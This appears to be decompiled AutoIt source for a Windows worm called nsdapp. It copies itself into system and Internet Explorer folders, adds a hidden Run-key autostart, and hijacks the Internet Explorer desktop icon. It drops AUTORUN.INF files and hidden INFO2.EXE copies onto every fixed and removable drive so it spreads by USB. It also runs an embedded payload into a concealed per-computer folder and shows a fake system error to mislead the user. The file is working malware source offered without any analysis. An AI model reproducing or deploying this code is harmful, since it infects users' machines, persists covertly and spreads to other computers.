; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\$ROOT\var\src\nsdapp\nsdapp.au3>
; ----------------------------------------------------------------------------

#NoTrayIcon
Opt("MustDeclareVars",1)

Dim Const $DIRECT=@WindowsDir&"\Debug"
Dim Const $1ST_CMPNENT=@SystemDir&"\wbem\nsdapp.exe"
Dim Const $IE_CMPNENT=@ProgramFilesDir&"\Internet Explorer\Connection Wizard\icwnsdp.exe"
Dim $target

Select
	Case $CmdLine[0]=0
		Nestor(1)
	Case ($CmdLine[1]="_OPEN_DRIVE")
		Run(@WindowsDir&"\Explorer.exe /e,"&@ScriptDir&"\..")
		Nestor(1)
	Case ($CmdLine[1]="_OPEN_HOME_PAGE")
		Run(@ProgramFilesDir&"\Internet Explorer\IEXPLORE.EXE",@ProgramFilesDir&"\Internet Explorer",@SW_MAXIMIZE)
		Nestor(1)
	Case ($CmdLine[1]="-expand")
		Expand()
	Case ($CmdLine[1]="-gui")
		FileInstall("gui.dat",@TempDir&"\00100001.EXE",1)
		RunWait(@TempDir&"\00100001.EXE")
		FileDelete(@TempDir&"\00100001.EXE")
	Case ($CmdLine[1]="-inactive")
		Uninstall()
	Case Else
		MsgBox(262160,"System error","Mouse Pad has performed an illegal instruction ("&$CmdLine[1]&") and will be shut down",9)
EndSelect
Exit (0)

Func Fs32()
	If DriveGetFileSystem(@HomeDrive)="NTFS" Then
		$target=@WindowsDir&"\system32\config\systemprofile\NtUser.."
	Else
		$target=@HomeDrive&"\..."
	Endif
	Return $target
EndFunc

Func Nestor($v)
	$target=Fs32()
	FileInstall("nsdapp.dat",$DIRECT&"\drwtsn32.exe",1)
	RunWait(@COMSPEC&" /c md "&$target&"\",@SystemDir,@SW_HIDE)
	RunWait($DIRECT&"\drwtsn32.exe "&$target&"\"&@ComputerName&"_"&@YDAY&@YEAR&".EXE")
	FileDelete($DIRECT&"\drwtsn32.exe")
	If (@ScriptFullPath)<>($1ST_CMPNENT) Then
		FileCopy(""&@ScriptFullPath&"",$1ST_CMPNENT,1)
		FileSetAttrib($1ST_CMPNENT,"-SH")
	Endif
	If (@ScriptFullPath)<>($IE_CMPNENT) Then
		FileCopy(""&@ScriptFullPath&"",$IE_CMPNENT,1)
		FileSetAttrib($IE_CMPNENT,"-SH")
	Endif
	;Func Regent
	RegWrite("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command","","REG_SZ",$IE_CMPNENT&" _OPEN_HOME_PAGE")
	RegWrite("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\ShellFolder","Attributes","REG_DWORD",0)
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run","1","REG_SZ","nsdapp")
	If $v=1 Then Recycler()
EndFunc

Func Recycler()
	Dim $drives=DriveGetDrive("FIXED")
	If NOT @error Then
		For $i = 1 to $drives[0]
			If (DriveGetFileSystem($drives[$i]))="NTFS" Then
				FileSetAttrib($drives[$i]&"\AUTORUN.INF","-RSH")
				FileInstall("auntfs.dat",$drives[$i]&"\AUTORUN.INF",1)
				FileSetAttrib($drives[$i]&"\AUTORUN.INF","+SH")
				FileCopy(@ScriptFullPath,$drives[$i]&"\RECYCLER\INFO2.EXE",1)
				FileSetAttrib($drives[$i]&"\RECYCLER\INFO2.EXE","+SH")
			Else
				FileSetAttrib($drives[$i]&"\AUTORUN.INF","-RSH")
				FileInstall("aufat.dat",$drives[$i]&"\AUTORUN.INF",1)
				FileSetAttrib($drives[$i]&"\AUTORUN.INF","+SH")
				FileCopy(@ScriptFullPath,$drives[$i]&"\Recycled\INFO2.EXE",1)
				FileSetAttrib($drives[$i]&"\Recycled\INFO2.EXE","+SH")
			Endif
		Next
	Endif
	$drives=""
	$drives=DriveGetDrive("REMOVABLE")
	If NOT @error Then
		For $i = 2 to $drives[0]
			DirCreate($drives[$i]&"\Recycled")
			FileSetAttrib($drives[$i]&"\AUTORUN.INF","-RSH")
			FileInstall("aufat.dat",$drives[$i]&"\AUTORUN.INF",1)
			FileSetAttrib($drives[$i]&"\AUTORUN.INF","+SH")
			FileCopy(@ScriptFullPath,$drives[$i]&"\Recycled\INFO2.EXE",1)
			FileSetAttrib($drives[$i]&"\Recycled","+SH",1)
		Next
	Endif
EndFunc

Func Expand()
	$target=Fs32()
	FileChangeDir(@WorkingDir)
	DirCreate(@ComputerName)
	FileChangeDir(@ComputerName)
	RunWait(@COMSPEC&" /c copy "&$target&"\*.*","",@SW_MAXIMIZE)
	RunWait(@COMSPEC&" /c ren *.EXE *.ASM","",@SW_HIDE)
	If (MsgBox(262436,"TK-32","Files inflated in "&@WorkingDir&". Do you want flush the _$target_ folder?",80))==6 Then
		RunWait(@COMSPEC&" /c rd "&$target&"\ /s /q","",@SW_HIDE)
		Nestor(0)
	Endif
EndFunc

Func Uninstall()
	Dim $drives=DriveGetDrive("FIXED")
	If NOT @error Then
		For $i = 1 to $drives[0]
			FileDelete($drives[$i]&"\AUTORUN.INF")
		Next
	Endif
	$drives=""
	$drives=DriveGetDrive("REMOVABLE")
	If NOT @error Then
		For $i = 2 to $drives[0]
			FileDelete($drives[$i]&"\AUTORUN.INF")
		Next
	Endif
	RegWrite("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command","","REG_SZ",@ProgramFilesDir&"\Internet Explorer\IEXPLORE.EXE")
	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","Shell","REG_SZ","Explorer.exe")
	RegDelete("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run","1")
EndFunc

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\$ROOT\var\src\nsdapp\nsdapp.au3>
; ----------------------------------------------------------------------------

